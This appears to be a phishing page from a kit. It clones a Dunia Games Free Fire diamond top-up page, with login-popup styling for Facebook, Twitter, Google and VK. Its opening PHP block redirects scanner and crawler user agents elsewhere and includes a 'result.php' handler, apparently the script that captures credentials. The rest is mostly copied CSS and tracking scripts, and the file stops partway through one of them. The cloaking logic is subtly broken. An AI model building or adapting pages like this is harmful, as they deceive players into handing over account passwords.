<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$useragent) || preg_match('/Java1.1.4/si',$useragent) || preg_match('/MS FrontPage Express/si',$useragent) || preg_match('/HTTrack/si',$useragent) || preg_match('/IDentity/si',$useragent) || preg_match('/HyperBrowser/si',$useragent) || preg_match('/Lynx/si',$useragent)) 
{
header('https://www.facebook.com/Nextnesia');
die();
}

include 'Nextnesia/result.php';
?>
<html lang="en" class="" style="">

<head>


    <script type="text/javascript" async="" src="https://www.google-analytics.com/plugins/ua/ec.js"></script>
    <script type="text/javascript" src="https://bam.nr-data.net/1/e59e710ebb?a=277698390&amp;sa=1&amp;v=1118.0c07c19&amp;t=Unnamed%20Transaction&amp;rst=3353&amp;ref=https://duniagames.co.id/&amp;be=337&amp;fe=3170&amp;dc=1126&amp;af=err,xhr,stn,ins,spa&amp;perf=%7B%22timing%22:%7B%22of%22:1611706893399,%22n%22:0,%22f%22:3,%22dn%22:23,%22dne%22:23,%22c%22:23,%22s%22:42,%22ce%22:89,%22rq%22:90,%22rp%22:160,%22rpe%22:173,%22dl%22:203,%22di%22:1123,%22ds%22:1124,%22de%22:1136,%22dc%22:3169,%22l%22:3170,%22le%22:3196%7D,%22navigation%22:%7B%7D%7D&amp;jsonp=NREUM.setToken"></script>
    
    <script src="https://www.googletagservices.com/activeview/js/current/osd.js?cb=%2Fr20100101"></script>
    <script src="https://partner.googleadservices.com/gampad/cookie.js?domain=duniagames.co.id&amp;callback=_gfp_s_&amp;client=ca-pub-7464976184889071&amp;cookie=ID%3D3478b1a398761b53-223e2146d0c500da%3AT%3D1611525876%3ART%3D1611525876%3AS%3DALNI_MYjMMP8HmCIcDESLJCu0DclKT59UQ"></script>
    <script type="text/javascript" id="www-widgetapi-script" src="https://www.youtube.com/s/player/27cea338/www-widgetapi.vflset/www-widgetapi.js" async=""></script>
    <script src="https://pagead2.googlesyndication.com/pagead/js/r20210121/r20190131/show_ads_impl_fy2019.js" id="google_shimpl"></script>
    <script src="https://www.youtube.com/player_api"></script>
    <script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script>
    <script type="text/javascript" async="" src="https://certify-js.alexametrics.com/atrk.js"></script>
    <script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script>
    <script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=G-04C92K3KPE&amp;l=dataLayer&amp;cx=c"></script>
    <script src="https://connect.facebook.net/signals/config/347980038942340?v=2.9.33&amp;r=stable" async=""></script>
    <script src="https://connect.facebook.net/signals/config/199579203911645?v=2.9.33&amp;r=stable" async=""></script>
    <script async="" src="https://connect.facebook.net/en_US/fbevents.js"></script>
    <script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-MHBW9T7"></script>
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link rel="stylesheet" href=".assets/.css/popup-AlexHost.css">
      <link rel="stylesheet" href=".assets/.css/facebook-AlexHost.css">
      <link rel="stylesheet" href=".assets/.css/VK-AlexHost.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" integrity="sha512-HK5fgLBL+xu6dm/Ii3z4xhlSUyZgTT9tuc/hSrtw6uzJOvgRr2a9jyxxT1ely+B+xFAmJKVSTbpM/CuL7qxO8w==" crossorigin="anonymous" />
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@100&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="preconnect" href="https://fonts.gstatic.com">
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300&display=swap" rel="stylesheet">
<style>
.popup-login {
	background:rgba(0,0,0,0.8);
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999999;
}
.btn-login {
	background:#eaa300;
	width:100%;
	height:45px;
	margin-left:auto;
	margin-right:auto;
	margin-bottom:5px;
	border:1px solid #ffcc57;
	border-radius: 10px;
	display:block;
}
.btn-login-logo-wrapper {
	background:#ffcc57;
	width:60px;
	height:100%;
	padding:10px;
	margin-left:auto;
	margin-right:5px;
	border-top-left-radius: 8px;
	border-bottom-left-radius: 8px;
	display:block;
	float:left;
}
.btn-login-logo-wrapper img {
	background:#ffcc57;
	width:25px;
	height:auto;
	margin-left:auto;
	margin-right:auto;
	display:block;
}
.btn-login-txt {
	padding-top:4px;
	color:#000;
	font-size:18px;
	font-family:'Teko',sans-serif;
	text-align:center;
	text-transform:uppercase;
	line-height:40px;
}
.btn-login i {
	margin-top:5px;
	margin-right:5px;
	color:#000;
	float:right;
}
.popup-box-login-fb {
	background:#ECEFF6;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:1.9%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.popup-box-login-twitter {
	background:#fff;
	max-width:330px;
	height:350px;
	position:relative;
	margin:50px auto;
	margin-top:10%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.popup-box-login-google {
	background:#fff;
	max-width:330px;
	height:400px;
	position:relative;
	margin:50px auto;
	margin-top:10%;
	padding:15px;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.close-fb {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	position:absolute;
	top:-8px;
	right:-10px;
	display:block;
}
.close-fb i {
	color:#fff;
	padding-top:1px;
}
.close-other {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	top:-8px;
	right:-10px;
	position:absolute;
	z-index:9999999;
	display:block;
}
.close-other i {
	color:#fff;
	padding-top:1px;
}
.content-box-fb .alert {
    display: none;
    left: -15px;
    position: relative;
    width: 330px;
    padding: 5px;
    background: red;
    color:#fff;
    font-size: 13px;
    font-family: system-ui;
}
.navbar-fb {
	background: #3b5998;
	width: 100%;
	height: auto;
	padding: 8px;
	border-top-left-radius: 10px;
	border-top-right-radius: 10px;
}
.navbar-fb img {
    width: 115px;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.content-box-fb {
    width: 300px;
    height: auto;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.content-box-fb img {
    width: 60;
    margin-top: 20px;
    margin-left: auto;
    margin-right: auto;
    border-radius: 12px;
    display: block;
}
.txt-login-fb {
    width: 270px;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 17px;
    padding: 8px;
    color: #90949c;
    font-size: 16px;
    font-family: system-ui;
    text-align: center;
    display: block;
}
.login-form input[type="text"],.login-form input[type="password"] {
	width: 100%;
	height: auto;
	padding: 12px;
	color: #000;
	font-size: 14px;
	font-weight: 400;
	font-family: 'Lato',sans-serif;
	border: 1px solid #bdbebf;
	cursor: pointer;
	outline: none;
}
.login-form input[type="text"] {
    margin: 0;
    padding-bottom: 13px;
	border-bottom: none;
	border-radius: 4px 4px 0 0;
	box-shadow: 0 -1px 0 #E0E0E0 inset,0 0px 0px rgba(0,0,0,0.23) inset;
}
.login-form input[type="password"] {
    margin: 0;
	border-top: none;
	border-radius: 0 0 4px 4px;
	box-shadow: 0 -0px 0 rgba(0,0,0,0.23) inset,0 0px 0px rgba(255,255,255,0.1);
}
.btn-login-fb {
	background: #1778f2;
	width: 100%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	padding: 10px;
	color: #fff;
	font-size: 14px;
	font-family: system-ui;
	font-weight: bold;
	text-align: center;
	text-shadow: 1px 0px rgba(0, 0, 0, 0.3);
	border: 1px solid #3578e5;
	border-radius: 5px;
	box-shadow: 1px 1px 1px 1px rgba(0, 0, 0, 0.1);
	outline: none;
	display: block;
}
.txt-create-account {
    width: 100%;
    height: auto;
    padding: 5px;
    color: #3b5998;
    font-size: 13.5px;
    font-family: system-ui;
    text-align: center;
}
.txt-not-now {
    width: 100%;
    height: auto;
    padding: 5px;
    color: #3b5998;
    font-size: 13.5px;
    font-family: system-ui;
    text-align: center;
}
.txt-forgotten-password {
    width: 100%;
    height: auto;
    margin-bottom: 30px;
    padding: 5px;
    color: #7596c8;
    font-size: 13.5px;
    font-family: system-ui;
    text-align: center;
}
.language-box {
    width: 100%;
    height: auto;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.language-name {
    width: 40%;
    height: auto;
    margin: 5px;
    margin-bottom: 0px;
    color: #3b5998;
    font-size: 12px;
    font-family: system-ui;
    text-align: center;
    display: inline-block;
}
.language-name i {
    width: 23px;
    padding: 4px;
    color: #90949c;
    border: 1px solid #3b5998;
    border-radius: 3px;
}
.language-name-active {
    color: #90949c;
    font-weight: bold;
}
.copyright {
    width: 40%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    color: #90949c;
    font-size: 12px;
    font-family: system-ui;
    text-align: center;
    display: block;
}
.header-twitter {
    background: #fff;
    width: 100%;
    font-size: 25px;
    font-weight: bold;
    text-align: left;
    position: relative;
    border-radius: 10px;
    margin-top: 20px;
}
.header-twitter img {
    margin-top: 20px;
    width: 55;
}
.box-twitter {
    width: 100%;
    height: 400px;
    position: absolute;
    overflow: none;
    font-size: 15px;
    font-family: sans-serif;
    border-radius: 10px;
}
.txt-login-twitter {
    color: #000;
    font-size: 20px;
    font-weight: bold;
    font-family: arial, sans-serif;
    margin-top: 3%;
    margin-bottom: 5%;
}
.input-box-twitter {
    background: #ffffff;
	width: 90%;
	height: 40px;
	margin-top: 30px;
	padding: 10px;
    padding-top: 5px;
    padding-bottom: 5px;
	font-size: 12px;
	font-family: arial, sans-serif;
	text-align: left;
	position: relative;
	border: 1px solid #d3d3d3;
	border-radius: 5px;
	outline: none;
	z-index: 2;
}

.input-box-twitter input {
	background: transparent;
	width: 100%;
	height: auto;
	color: #000;
	font-size: 14px;
	font-family: arial, sans-serif;
	text-align: left;
	position: relative;
	border: none;
	outline: none;
    z-index: 2;
    padding: 5px 0;
}
.btn-login-twitter {
    background: #5181b8;
    width: 90%;
    height: auto;
    padding: 14px;
    color: #fff;
    font-size: 15px;
    font-weight: bold;
    font-family: arial, sans-serif;
    border: none;
    border-radius: 2px;
    outline: none;
    letter-spacing: 1;
    margin-top: 30px;
}
.footer-menu-twitter {
    width: auto;
    height: auto;
    margin: 0.5%;
    margin-top: 7%;
    color: #1da1f2;
    font-size: 14px;
    font-family: arial, sans-serif;
    display: inline-block;
}
.bulet {
    color: #000;
    font-size: 8px;
}
.aktifnya {
    color: #1da1f2;
    border-bottom: 2px solid #1da1f2;
}
</style>
    <script>
        var pathURL = window.location.pathname;
        window.dataLayer = window.dataLayer || [];
        (function(w, d, s, l, i) {
            w[l] = w[l] || [];
            w[l].push({
                'gtm.start': new Date().getTime(),
                event: 'gtm.js'
            });
            var f = d.getElementsByTagName(s)[0],
                j = d.createElement(s),
                dl = l != 'dataLayer' ? '&l=' + l : '';
            j.async = true;
            j.src =
                'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
            f.parentNode.insertBefore(j, f);
        })(window, document, 'script', 'dataLayer', 'GTM-MHBW9T7');
    </script>



    <script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-144636608-1"></script>
    <script>
        function gtag() {
            dataLayer.push(arguments);
        }
        gtag('js', new Date());

        gtag('config', 'UA-144636608-1');
    </script>

    <script>
        ! function(f, b, e, v, n, t, s) {
            if (f.fbq) return;
            n = f.fbq = function() {
                n.callMethod ?
                    n.callMethod.apply(n, arguments) : n.queue.push(arguments)
            };
            if (!f._fbq) f._fbq = n;
            n.push = n;
            n.loaded = !0;
            n.version = '2.0';
            n.queue = [];
            t = b.createElement(e);
            t.async = !0;
            t.src = v;
            s = b.getElementsByTagName(e)[0];
            s.parentNode.insertBefore(t, s)
        }(window, document, 'script',
            'https://connect.facebook.net/en_US/fbevents.js');
        fbq('init', '199579203911645');
        fbq('track', 'PageView');
    </script>
    <noscript><img height="1" width="1" style="display:none"
      src="https://www.facebook.com/tr?id=199579203911645&ev=PageView&noscript=1" /></noscript>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="Cache-control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, height=device-height, maximum-scale=1.0, user-scalable=no">
    <title>Top Up Free Fire (FF) - Beli Top Up Free Fire Murah Online | Dunia Games</title>
    <meta name="title" content="Top Up Free Fire (FF) - Beli Top Up Free Fire Murah Online | Dunia Games">
    <meta name="description" content="Top Up Free Fire - Beli Voucher Free Fire dan diamonds Free Fire murah online dari Dunia Games pakai pulsa Telkomsel atau opsi pembayaran lainnya.">
    <style type="text/css">
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300&display=swap');
        @font-face {
            font-family: 'Montserrat-bold';
        }
        body {
            font-family: 'Roboto', sans-serif;
        }
        svg:not(:root).svg-inline--fa {
            overflow: visible;
        }

        .svg-inline--fa {
            display: inline-block;
            font-size: inherit;
            height: 1em;
            overflow: visible;
            vertical-align: -0.125em;
        }

        .svg-inline--fa.fa-lg {
            vertical-align: -0.225em;
        }

        .svg-inline--fa.fa-w-1 {
            width: 0.0625em;
        }

        .svg-inline--fa.fa-w-2 {
            width: 0.125em;
        }

        .svg-inline--fa.fa-w-3 {
            width: 0.1875em;
        }

        .svg-inline--fa.fa-w-4 {
            width: 0.25em;
        }

        .svg-inline--fa.fa-w-5 {
            width: 0.3125em;
        }

        .svg-inline--fa.fa-w-6 {
            width: 0.375em;
        }

        .svg-inline--fa.fa-w-7 {
            width: 0.4375em;
        }

        .svg-inline--fa.fa-w-8 {
            width: 0.5em;
        }

        .svg-inline--fa.fa-w-9 {
            width: 0.5625em;
        }

        .svg-inline--fa.fa-w-10 {
            width: 0.625em;
        }

        .svg-inline--fa.fa-w-11 {
            width: 0.6875em;
        }

        .svg-inline--fa.fa-w-12 {
            width: 0.75em;
        }

        .svg-inline--fa.fa-w-13 {
            width: 0.8125em;
        }

        .svg-inline--fa.fa-w-14 {
            width: 0.875em;
        }

        .svg-inline--fa.fa-w-15 {
            width: 0.9375em;
        }

        .svg-inline--fa.fa-w-16 {
            width: 1em;
        }

        .svg-inline--fa.fa-w-17 {
            width: 1.0625em;
        }

        .svg-inline--fa.fa-w-18 {
            width: 1.125em;
        }

        .svg-inline--fa.fa-w-19 {
            width: 1.1875em;
        }

        .svg-inline--fa.fa-w-20 {
            width: 1.25em;
        }

        .svg-inline--fa.fa-pull-left {
            margin-right: 0.3em;
            width: auto;
        }

        .svg-inline--fa.fa-pull-right {
            margin-left: 0.3em;
            width: auto;
        }

        .svg-inline--fa.fa-border {
            height: 1.5em;
        }

        .svg-inline--fa.fa-li {
            width: 2em;
        }

        .svg-inline--fa.fa-fw {
            width: 1.25em;
        }

        .fa-layers svg.svg-inline--fa {
            bottom: 0;
            left: 0;
            margin: auto;
            position: absolute;
            right: 0;
            top: 0;
        }

        .fa-layers {
            display: inline-block;
            height: 1em;
            position: relative;
            text-align: center;
            vertical-align: -0.125em;
            width: 1em;
        }

        .fa-layers svg.svg-inline--fa {
            -webkit-transform-origin: center center;
            transform-origin: center center;
        }

        .fa-layers-counter,
        .fa-layers-text {
            display: inline-block;
            position: absolute;
            text-align: center;
        }

        .fa-layers-text {
            left: 50%;
            top: 50%;
            -webkit-transform: translate(-50%, -50%);
            transform: translate(-50%, -50%);
            -webkit-transform-origin: center center;
            transform-origin: center center;
        }

        .fa-layers-counter {
            background-color: #ff253a;
            border-radius: 1em;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            color: #fff;
            height: 1.5em;
            line-height: 1;
            max-width: 5em;
            min-width: 1.5em;
            overflow: hidden;
            padding: 0.25em;
            right: 0;
            text-overflow: ellipsis;
            top: 0;
            -webkit-transform: scale(0.25);
            transform: scale(0.25);
            -webkit-transform-origin: top right;
            transform-origin: top right;
        }

        .fa-layers-bottom-right {
            bottom: 0;
            right: 0;
            top: auto;
            -webkit-transform: scale(0.25);
            transform: scale(0.25);
            -webkit-transform-origin: bottom right;
            transform-origin: bottom right;
        }

        .fa-layers-bottom-left {
            bottom: 0;
            left: 0;
            right: auto;
            top: auto;
            -webkit-transform: scale(0.25);
            transform: scale(0.25);
            -webkit-transform-origin: bottom left;
            transform-origin: bottom left;
        }

        .fa-layers-top-right {
            right: 0;
            top: 0;
            -webkit-transform: scale(0.25);
            transform: scale(0.25);
            -webkit-transform-origin: top right;
            transform-origin: top right;
        }

        .fa-layers-top-left {
            left: 0;
            right: auto;
            top: 0;
            -webkit-transform: scale(0.25);
            transform: scale(0.25);
            -webkit-transform-origin: top left;
            transform-origin: top left;
        }

        .fa-lg {
            font-size: 1.3333333333em;
            line-height: 0.75em;
            vertical-align: -0.0667em;
        }

        .fa-xs {
            font-size: 0.75em;
        }

        .fa-sm {
            font-size: 0.875em;
        }

        .fa-1x {
            font-size: 1em;
        }

        .fa-2x {
            font-size: 2em;
        }

        .fa-3x {
            font-size: 3em;
        }

        .fa-4x {
            font-size: 4em;
        }

        .fa-5x {
            font-size: 5em;
        }

        .fa-6x {
            font-size: 6em;
        }

        .fa-7x {
            font-size: 7em;
        }

        .fa-8x {
            font-size: 8em;
        }

        .fa-9x {
            font-size: 9em;
        }

        .fa-10x {
            font-size: 10em;
        }

        .fa-fw {
            text-align: center;
            width: 1.25em;
        }

        .fa-ul {
            list-style-type: none;
            margin-left: 2.5em;
            padding-left: 0;
        }

        .fa-ul>li {
            position: relative;
        }

        .fa-li {
            left: -2em;
            position: absolute;
            text-align: center;
            width: 2em;
            line-height: inherit;
        }

        .fa-border {
            border: solid 0.08em #eee;
            border-radius: 0.1em;
            padding: 0.2em 0.25em 0.15em;
        }

        .fa-pull-left {
            float: left;
        }

        .fa-pull-right {
            float: right;
        }

        .fa.fa-pull-left,
        .fas.fa-pull-left,
        .far.fa-pull-left,
        .fal.fa-pull-left,
        .fab.fa-pull-left {
            margin-right: 0.3em;
        }

        .fa.fa-pull-right,
        .fas.fa-pull-right,
        .far.fa-pull-right,
        .fal.fa-pull-right,
        .fab.fa-pull-right {
            margin-left: 0.3em;
        }

        .fa-spin {
            -webkit-animation: fa-spin 2s infinite linear;
            animation: fa-spin 2s infinite linear;
        }

        .fa-pulse {
            -webkit-animation: fa-spin 1s infinite steps(8);
            animation: fa-spin 1s infinite steps(8);
        }

        @-webkit-keyframes fa-spin {
            0% {
                -webkit-transform: rotate(0deg);
                transform: rotate(0deg);
            }
            100% {
                -webkit-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }

        @keyframes fa-spin {
            0% {
                -webkit-transform: rotate(0deg);
                transform: rotate(0deg);
            }
            100% {
                -webkit-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }

        .fa-rotate-90 {
            -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=1)";
            -webkit-transform: rotate(90deg);
            transform: rotate(90deg);
        }

        .fa-rotate-180 {
            -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2)";
            -webkit-transform: rotate(180deg);
            transform: rotate(180deg);
        }

        .fa-rotate-270 {
            -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=3)";
            -webkit-transform: rotate(270deg);
            transform: rotate(270deg);
        }

        .fa-flip-horizontal {
            -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=0, mirror=1)";
            -webkit-transform: scale(-1, 1);
            transform: scale(-1, 1);
        }

        .fa-flip-vertical {
            -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2, mirror=1)";
            -webkit-transform: scale(1, -1);
            transform: scale(1, -1);
        }

        .fa-flip-both,
        .fa-flip-horizontal.fa-flip-vertical {
            -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2, mirror=1)";
            -webkit-transform: scale(-1, -1);
            transform: scale(-1, -1);
        }

        :root .fa-rotate-90,
        :root .fa-rotate-180,
        :root .fa-rotate-270,
        :root .fa-flip-horizontal,
        :root .fa-flip-vertical,
        :root .fa-flip-both {
            -webkit-filter: none;
            filter: none;
        }

        .fa-stack {
            display: inline-block;
            height: 2em;
            position: relative;
            width: 2.5em;
        }

        .fa-stack-1x,
        .fa-stack-2x {
            bottom: 0;
            left: 0;
            margin: auto;
            position: absolute;
            right: 0;
            top: 0;
        }

        .svg-inline--fa.fa-stack-1x {
            height: 1em;
            width: 1.25em;
        }

        .svg-inline--fa.fa-stack-2x {
            height: 2em;
            width: 2.5em;
        }

        .fa-inverse {
            color: #fff;
        }

        .sr-only {
            border: 0;
            clip: rect(0, 0, 0, 0);
            height: 1px;
            margin: -1px;
            overflow: hidden;
            padding: 0;
            position: absolute;
            width: 1px;
        }

        .sr-only-focusable:active,
        .sr-only-focusable:focus {
            clip: auto;
            height: auto;
            margin: 0;
            overflow: visible;
            position: static;
            width: auto;
        }

        .svg-inline--fa .fa-primary {
            fill: var(--fa-primary-color, currentColor);
            opacity: 1;
            opacity: var(--fa-primary-opacity, 1);
        }

        .svg-inline--fa .fa-secondary {
            fill: var(--fa-secondary-color, currentColor);
            opacity: 0.4;
            opacity: var(--fa-secondary-opacity, 0.4);
        }

        .svg-inline--fa.fa-swap-opacity .fa-primary {
            opacity: 0.4;
            opacity: var(--fa-secondary-opacity, 0.4);
        }

        .svg-inline--fa.fa-swap-opacity .fa-secondary {
            opacity: 1;
            opacity: var(--fa-primary-opacity, 1);
        }

        .svg-inline--fa mask .fa-primary,
        .svg-inline--fa mask .fa-secondary {
            fill: black;
        }

        .fad.fa-inverse {
            color: #fff;
        }
    </style>
    <link rel="icon" type="image/x-icon" href="./.assets/.images/favicon.ico">
    <meta name="apple-mobile-web-app-title" content="DuniaGames">
    <meta name="application-name" content="DuniaGames">
    <meta name="msapplication-TileColor" content="#da532c">
    <meta name="msapplication-TileImage" content="/mstile-144x144.png">
    <meta name="theme-color" content="#aa0000">
    <meta property="fb:pages" content="192790697414729">
    <meta property="fb:app_id" content="168729200653978">
    <meta property="og:type" content="website">
    <meta property="og:title" content="Top Up Free Fire (FF) - Beli Top Up Free Fire Murah Online | Dunia Games">
    <meta property="og:description" content="Top Up Free Fire - Beli Voucher Free Fire dan diamonds Free Fire murah online dari Dunia Games pakai pulsa Telkomsel atau opsi pembayaran lainnya.">
    <meta property="og:url" content="https://duniagames.co.id">
    <meta property="og:image" content="https://api.duniagames.co.id/api/content/upload/file/15974662431598594306.png">
    <link rel="icon" type="image/x-icon" href="./.assets/.images/favicon.ico">

    <script type="text/javascript">
        window.NREUM || (NREUM = {}), __nr_require = function(t, e, n) {
            function r(n) {
                if (!e[n]) {
                    var o = e[n] = {
                        exports: {}
                    };
                    t[n][0].call(o.exports, function(e) {
                        var o = t[n][1][e];
                        return r(o || e)
                    }, o, o.exports)
                }
                return e[n].exports
            }
            if ("function" == typeof __nr_require) return __nr_require;
            for (var o = 0; o < n.length; o++) r(n[o]);
            return r
        }({
            1: [function(t, e, n) {
                function r(t) {
                    try {
                        s.console && console.log(t)
                    } catch (e) {}
                }
                var o, i = t("ee"),
                    a = t(21),
                    s = {};
                try {
                    o = localStorage.getItem("__nr_flags").split(","), console && "function" == typeof console.log && (s.console = !0, o.indexOf("dev") !== -1 && (s.dev = !0), o.indexOf("nr_dev") !== -1 && (s.nrDev = !0))
                } catch (c) {}
                s.nrDev && i.on("internal-error", function(t) {
                    r(t.stack)
                }), s.dev && i.on("fn-err", function(t, e, n) {
                    r(n.stack)
                }), s.dev && (r("NR AGENT IN DEVELOPMENT MODE"), r("flags: " + a(s, function(t, e) {
                    return t
                }).join(", ")))
            }, {}],
            2: [function(t, e, n) {
                function r(t, e, n, r, s) {
                    try {
                        l ? l -= 1 : o(s || new UncaughtException(t, e, n), !0)
                    } catch (f) {
                        try {
                            i("ierr", [f, c.now(), !0])
                        } catch (d) {}
                    }
                    return "function" == typeof u && u.apply(this, a(arguments))
                }

                function UncaughtException(t, e, n) {
                    this.message = t || "Uncaught error with no additional information", this.sourceURL = e, this.line = n
                }

                function o(t, e) {
                    var n = e ? null : c.now();
                    i("err", [t, n])
                }
                var i = t("handle"),
                    a = t(22),
                    s = t("ee"),
                    c = t("loader"),
                    f = t("gos"),
                    u = window.onerror,
                    d = !1,
                    p = "nr@seenError",
                    l = 0;
                c.features.err = !0, t(1), window.onerror = r;
                try {
                    throw new Error
                } catch (h) {
                    "stack" in h && (t(13), t(12), "addEventListener" in window && t(6), c.xhrWrappable && t(14), d = !0)
                }
                s.on("fn-start", function(t, e, n) {
                    d && (l += 1)
                }), s.on("fn-err", function(t, e, n) {
                    d && !n[p] && (f(n, p, function() {
                        return !0
                    }), this.thrown = !0, o(n))
                }), s.on("fn-end", function() {
                    d && !this.thrown && l > 0 && (l -= 1)
                }), s.on("internal-error", function(t) {
                    i("ierr", [t, c.now(), !0])
                })
            }, {}],
            3: [function(t, e, n) {
                t("loader").features.ins = !0
            }, {}],
            4: [function(t, e, n) {
                function r() {
                    M++, N = y.hash, this[u] = g.now()
                }

                function o() {
                    M--, y.hash !== N && i(0, !0);
                    var t = g.now();
                    this[h] = ~~this[h] + t - this[u], this[d] = t
                }

                function i(t, e) {
                    E.emit("newURL", ["" + y, e])
                }

                function a(t, e) {
                    t.on(e, function() {
                        this[e] = g.now()
                    })
                }
                var s = "-start",
                    c = "-end",
                    f = "-body",
                    u = "fn" + s,
                    d = "fn" + c,
                    p = "cb" + s,
                    l = "cb" + c,
                    h = "jsTime",
                    m = "fetch",
                    v = "addEventListener",
                    w = window,
                    y = w.location,
                    g = t("loader");
                if (w[v] && g.xhrWrappable) {
                    var b = t(10),
                        x = t(11),
                        E = t(8),
                        O = t(6),
                        P = t(13),
                        R = t(7),
                        T = t(14),
                        L = t(9),
                        j = t("ee"),
                        S = j.get("tracer");
                    t(15), g.features.spa = !0;
                    var N, M = 0;
                    j.on(u, r), j.on(p, r), j.on(d, o), j.on(l, o), j.buffer([u, d, "xhr-done", "xhr-resolved"]), O.buffer([u]), P.buffer(["setTimeout" + c, "clearTimeout" + s, u]), T.buffer([u, "new-xhr", "send-xhr" + s]), R.buffer([m + s, m + "-done", m + f + s, m + f + c]), E.buffer(["newURL"]), b.buffer([u]), x.buffer(["propagate", p, l, "executor-err", "resolve" + s]), S.buffer([u, "no-" + u]), L.buffer(["new-jsonp", "cb-start", "jsonp-error", "jsonp-end"]), a(T, "send-xhr" + s), a(j, "xhr-resolved"), a(j, "xhr-done"), a(R, m + s), a(R, m + "-done"), a(L, "new-jsonp"), a(L, "jsonp-end"), a(L, "cb-start"), E.on("pushState-end", i), E.on("replaceState-end", i), w[v]("hashchange", i, !0), w[v]("load", i, !0), w[v]("popstate", function() {
                        i(0, M > 1)
                    }, !0)
                }
            }, {}],
            5: [function(t, e, n) {
                function r(t) {}
                if (window.performance && window.performance.timing && window.performance.getEntriesByType) {
                    var o = t("ee"),
                        i = t("handle"),
                        a = t(13),
                        s = t(12),
                        c = "learResourceTimings",
                        f = "addEventListener",
                        u = "resourcetimingbufferfull",
                        d = "bstResource",
                        p = "resource",
                        l = "-start",
                        h = "-end",
                        m = "fn" + l,
                        v = "fn" + h,
                        w = "bstTimer",
                        y = "pushState",
                        g = t("loader");
                    g.features.stn = !0, t(8);
                    var b = NREUM.o.EV;
                    o.on(m, function(t, e) {
                        var n = t[0];
                        n instanceof b && (this.bstStart = g.now())
                    }), o.on(v, function(t, e) {
                        var n = t[0];
                        n instanceof b && i("bst", [n, e, this.bstStart, g.now()])
                    }), a.on(m, function(t, e, n) {
                        this.bstStart = g.now(), this.bstType = n
                    }), a.on(v, function(t, e) {
                        i(w, [e, this.bstStart, g.now(), this.bstType])
                    }), s.on(m, function() {
                        this.bstStart = g.now()
                    }), s.on(v, function(t, e) {
                        i(w, [e, this.bstStart, g.now(), "requestAnimationFrame"])
                    }), o.on(y + l, function(t) {
                        this.time = g.now(), this.startPath = location.pathname + location.hash
                    }), o.on(y + h, function(t) {
                        i("bstHist", [location.pathname + location.hash, this.startPath, this.time])
                    }), f in window.performance && (window.performance["c" + c] ? window.performance[f](u, function(t) {
                        i(d, [window.performance.getEntriesByType(p)]), window.performance["c" + c]()
                    }, !1) : window.performance[f]("webkit" + u, function(t) {
                        i(d, [window.performance.getEntriesByType(p)]), window.performance["webkitC" + c]()
                    }, !1)), document[f]("scroll", r, {
                        passive: !0
                    }), document[f]("keypress", r, !1), document[f]("click", r, !1)
                }
            }, {}],
            6: [function(t, e, n) {
                function r(t) {
                    for (var e = t; e && !e.hasOwnProperty(u);) e = Object.getPrototypeOf(e);
                    e && o(e)
                }

                function o(t) {
                    s.inPlace(t, [u, d], "-", i)
                }

                function i(t, e) {
                    return t[1]
                }
                var a = t("ee").get("events"),
                    s = t(24)(a, !0),
                    c = t("gos"),
                    f = XMLHttpRequest,
                    u = "addEventListener",
                    d = "removeEventListener";
                e.exports = a, "getPrototypeOf" in Object ? (r(document), r(window), r(f.prototype)) : f.prototype.hasOwnProperty(u) && (o(window), o(f.prototype)), a.on(u + "-start", function(t, e) {
                    var n = t[1],
                        r = c(n, "nr@wrapped", function() {
                            function t() {
                                if ("function" == typeof n.handleEvent) return n.handleEvent.apply(n, arguments)
                            }
                            var e = {
                                object: t,
                                "function": n
                            }[typeof n];
                            return e ? s(e, "fn-", null, e.name || "anonymous") : n
                        });
                    this.wrapped = t[1] = r
                }), a.on(d + "-start", function(t) {
                    t[1] = this.wrapped || t[1]
                })
            }, {}],
            7: [function(t, e, n) {
                function r(t, e, n) {
